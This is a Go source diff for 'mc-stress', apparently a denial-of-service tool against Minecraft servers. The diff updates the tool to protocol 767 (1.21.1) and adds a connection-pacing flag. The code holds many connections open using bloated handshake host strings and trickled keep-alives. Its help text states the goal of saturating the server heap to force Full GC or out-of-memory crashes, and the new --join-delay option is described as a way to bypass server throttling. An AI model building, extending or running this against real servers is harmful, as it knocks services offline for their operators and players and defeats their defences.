@@ -34,6 +34,10 @@ var (
 	accessToken string
 	playerUUID  string
 
+	// joinGate is a shared rate-limiter channel; workers block here before each
+	// new TCP dial. nil means unlimited. Set via --join-delay.
+	joinGate chan struct{}
+
 	version = "dev"
 	commit  = "none"
 	date    = "unknown"
@@ -91,7 +95,7 @@ func dbgErr(label string, err error) {
 }
 
 // ---------------------------------------------------------------------------
-// Packet name tables (protocol 764 / 1.20.2)
+// Packet name tables (protocol 767 / 1.21.1)
 // ---------------------------------------------------------------------------
 
 func loginSPacketName(id int) string {
@@ -114,25 +118,33 @@ func loginSPacketName(id int) string {
 func configSPacketName(id int) string {
 	switch id {
 	case 0x00:
-		return "Plugin Message"
+		return "Cookie Request (Config)"
 	case 0x01:
-		return "Disconnect (Config)"
+		return "Plugin Message (Config)"
 	case 0x02:
-		return "Finish Configuration"
+		return "Disconnect (Config)"
 	case 0x03:
-		return "Keep Alive (Config)"
+		return "Finish Configuration"
 	case 0x04:
-		return "Ping (Config)"
+		return "Keep Alive (Config)"
 	case 0x05:
-		return "Registry Data"
+		return "Ping (Config)"
 	case 0x06:
-		return "Remove Resource Pack"
+		return "Reset Chat"
 	case 0x07:
-		return "Add Resource Pack"
+		return "Registry Data"
 	case 0x08:
-		return "Feature Flags"
+		return "Remove Resource Pack (Config)"
 	case 0x09:
-		return "Update Tags"
+		return "Known Packs"
+	case 0x0A:
+		return "Store Cookie (Config)"
+	case 0x0B:
+		return "Transfer (Config)"
+	case 0x0C:
+		return "Feature Flags"
+	case 0x0D:
+		return "Update Tags (Config)"
 	default:
 		return "Unknown"
 	}
@@ -140,9 +152,9 @@ func configSPacketName(id int) string {
 
 func playSPacketName(id int) string {
 	switch id {
-	case 0x1D:
+	case 0x1B, 0x1D:
 		return "Disconnect (Play)"
-	case 0x24:
+	case 0x26:
 		return "Keep Alive"
 	case 0x28:
 		return "Join Game"
@@ -178,7 +190,7 @@ func debugRun(target string, port uint16, bloatSize int, dribbleInterval time.Du
 	hs := buildHandshake(host, port)
 	conn.Write(hs)
 	dbgSend(0x00, "Handshake", hs)
-	dbgInfo("proto=764  host=%s(%d)  port=%d  next=Login", host[:min(12, len(host))], len(host), port)
+	dbgInfo("proto=767  host=%s(%d)  port=%d  next=Login", host[:min(12, len(host))], len(host), port)
 
 	ls := buildLoginStart(name)
 	conn.Write(ls)
@@ -283,12 +295,12 @@ func debugRunConfig(conn net.Conn, compressed bool, start time.Time) {
 		dbgRecv(id, configSPacketName(id), data)
 
 		switch id {
-		case 0x01: // Disconnect
+		case 0x02: // Disconnect (was 0x01)
 			dbgInfo("reason: %s", fmtJSON(data))
 			fmt.Printf("\n%sheld for %s%s\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
 			return
 
-		case 0x02: // Finish Configuration
+		case 0x03: // Finish Configuration (was 0x02)
 			ack := buildPacket(0x02, nil)
 			conn.Write(ack)
 			dbgSend(0x02, "Acknowledge Configuration", ack)
@@ -296,12 +308,12 @@ func debugRunConfig(conn net.Conn, compressed bool, start time.Time) {
 			debugRunPlay(conn, compressed, start)
 			return
 
-		case 0x03: // Keep Alive
+		case 0x04: // Keep Alive (was 0x03)
 			resp := buildPacket(0x03, data)
 			conn.Write(resp)
 			dbgSend(0x03, "Keep Alive Response (Config)", resp)
 
-		case 0x04: // Ping
+		case 0x05: // Ping (was 0x04)
 			resp := buildPacket(0x04, data)
 			conn.Write(resp)
 			dbgSend(0x04, "Pong", resp)
@@ -318,14 +330,23 @@ func debugRunPlay(conn net.Conn, compressed bool, start time.Time) {
 		id, data, err := readPacket(conn, compressed)
 		conn.SetReadDeadline(time.Time{})
 		if err != nil {
-			dbgErr("read (Play)", err)
+			// EOF is expected immediately after a Disconnect packet — don't log it.
+			if err.Error() != "EOF" {
+				dbgErr("read (Play)", err)
+			}
 			fmt.Printf("\n%sheld for %s%s\n\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
 			return
 		}
 
 		dbgRecv(id, playSPacketName(id), data)
 
-		if id == 0x24 { // Keep Alive
+		switch id {
+		case 0x1B, 0x1D: // Disconnect (Play)
+			dbgInfo("reason: %s", fmtJSON(data))
+			fmt.Printf("\n%sheld for %s%s\n\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
+			return
+
+		case 0x26: // Keep Alive
 			kaCount++
 			resp := buildPacket(0x18, data)
 			conn.Write(resp)
@@ -388,7 +409,7 @@ func buildPacket(id int, payload []byte) []byte {
 func buildHandshake(host string, port uint16) []byte {
 	var payload []byte
 	payload = writeVarInt(payload, 0x00)
-	payload = writeVarInt(payload, 764)
+	payload = writeVarInt(payload, 767)
 	payload = writeString(payload, host)
 	portBuf := make([]byte, 2)
 	binary.BigEndian.PutUint16(portBuf, port)
@@ -575,6 +596,23 @@ func minecraftSHA1(parts ...[]byte) string {
 
 var httpClient = &http.Client{Timeout: 10 * time.Second}
 
+// startJoinGate initialises the global rate limiter so that at most one new
+// TCP connection is opened per interval across all workers.
+func startJoinGate(interval time.Duration) {
+	joinGate = make(chan struct{}, 1)
+	joinGate <- struct{}{} // first connection is immediate
+	go func() {
+		ticker := time.NewTicker(interval)
+		defer ticker.Stop()
+		for range ticker.C {
+			select {
+			case joinGate <- struct{}{}:
+			default: // discard the tick if no worker is waiting
+			}
+		}
+	}()
+}
+
 func mojangJoin(token, uuid, serverHash string) error {
 	body := strings.NewReader(fmt.Sprintf(
 		`{"accessToken":%q,"selectedProfile":%q,"serverId":%q}`,
@@ -687,7 +725,9 @@ func drainConfig(conn net.Conn, compressed bool, verbose bool) bool {
 			return false
 		}
 		switch id {
-		case 0x02:
+		case 0x02: // Disconnect
+			return false
+		case 0x03: // Finish Configuration (was 0x02)
 			ack := buildPacket(0x02, nil)
 			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
 			_, err = conn.Write(ack)
@@ -697,13 +737,13 @@ func drainConfig(conn net.Conn, compressed bool, verbose bool) bool {
 			}
 			bytesSent.Add(int64(len(ack)))
 			return true
-		case 0x03:
+		case 0x04: // Keep Alive (was 0x03)
 			resp := buildPacket(0x03, data)
 			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
 			conn.Write(resp)
 			conn.SetWriteDeadline(time.Time{})
 			bytesSent.Add(int64(len(resp)))
-		case 0x04:
+		case 0x05: // Ping (was 0x04)
 			resp := buildPacket(0x04, data)
 			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
 			conn.Write(resp)
@@ -728,7 +768,7 @@ func holdConnPlay(conn net.Conn, compressed bool, verbose bool) {
 			}
 			return
 		}
-		if id == 0x24 {
+		if id == 0x26 {
 			resp := buildPacket(0x18, data)
 			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
 			conn.Write(resp)
@@ -783,6 +823,10 @@ func worker(target string, port uint16, bloatSize int, dribbleInterval time.Dura
 	rng := rand.New(rand.NewSource(seed))
 
 	for {
+		if joinGate != nil {
+			<-joinGate
+		}
+
 		host := randString(rng, bloatSize)
 		handshake := buildHandshake(host, port)
 
@@ -891,6 +935,7 @@ promotion from Eden → Old Gen, saturating heap and triggering Full GC / OOM.`,
 		dribble, _ := cmd.Flags().GetDuration("dribble-interval")
 		verbose, _ := cmd.Flags().GetBool("verbose")
 		debug, _ := cmd.Flags().GetBool("debug")
+		joinDelay, _ := cmd.Flags().GetDuration("join-delay")
 		accessToken, _ = cmd.Flags().GetString("access-token")
 		playerUUID, _ = cmd.Flags().GetString("player-uuid")
 
@@ -903,8 +948,12 @@ promotion from Eden → Old Gen, saturating heap and triggering Full GC / OOM.`,
 			return nil
 		}
 
-		fmt.Printf("mc-stress  target=%s  workers=%d  bloat=%d  dribble=%s\n\n",
-			target, workers, bloatSize, dribble)
+		if joinDelay > 0 {
+			startJoinGate(joinDelay)
+		}
+
+		fmt.Printf("mc-stress  target=%s  workers=%d  bloat=%d  dribble=%s  join-delay=%s\n\n",
+			target, workers, bloatSize, dribble, joinDelay)
 
 		go startReporter()
 
@@ -923,6 +972,7 @@ func init() {
 	f.DurationP("dribble-interval", "d", 5*time.Second, "interval between keep-alive bytes")
 	f.BoolP("verbose", "v", false, "print per-connection TCP errors")
 	f.Bool("debug", false, "single-connection debug mode with colored packet log")
+	f.DurationP("join-delay", "j", 0, "minimum gap between new connections (e.g. 4001ms to bypass server throttle)")
 	f.StringP("access-token", "a", "", "Mojang access token (online-mode auth)")
 	f.StringP("player-uuid", "u", "", "Mojang player UUID matching the access token")
 }
